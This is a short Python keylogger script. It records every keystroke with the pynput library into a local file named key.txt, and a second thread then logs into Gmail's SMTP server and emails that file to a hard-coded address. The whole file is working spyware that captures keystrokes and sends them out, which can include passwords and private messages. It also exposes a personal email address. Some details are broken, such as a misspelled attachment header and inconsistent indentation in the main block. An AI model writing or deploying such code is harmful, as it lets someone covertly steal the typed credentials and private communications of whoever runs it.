import threading
from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders





def key_listener():
     with keyboard.Listener(on_press = key_log) as lstn:
          lstn.join()


def key_log(key):

     if type(key) == keyboard._win32.KeyCode:
          k = key.char

     else:
          k = ' ' + str(key) + ' '


     data = str(k)
     with open("key.txt", "a") as File:
          File.write(data+'\n')
          File.close()



def mail():
     mail_content = '''all key'''

     message = MIMEMultipart()

     password = "......"
     message['From'] = "Elhamghahremani464@gmail.com"
     message['To'] = "Elhamghahremani464@gmail.com"
     message['Subject'] = "key"

     message.attach(MIMEText(mail_content, 'plain'))

     attach_file_name = 'key.txt'
     attach_file = open(attach_file_name, 'rb')
     payload = MIMEBase('application', 'octate-stream')
     payload.set_payload((attach_file).read())
     encoders.encode_base64(payload)
     payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
     message.attach(payload)

     session = smtplib.SMTP('smtp.gmail.com', 587)
     session.starttls()
     session.login(message['From'], password)
     session.sendmail(message['From'], message['To'], message.as_string())

     session.quit()
     print('Mail Sent')

if __name__ == "__main__":
     # creating thread
     t1 = threading.Thread(target=key_listener)
     t2 = threading.Thread(target=mail)
t1.start()
t2.start()
t1.join()
t2.join()



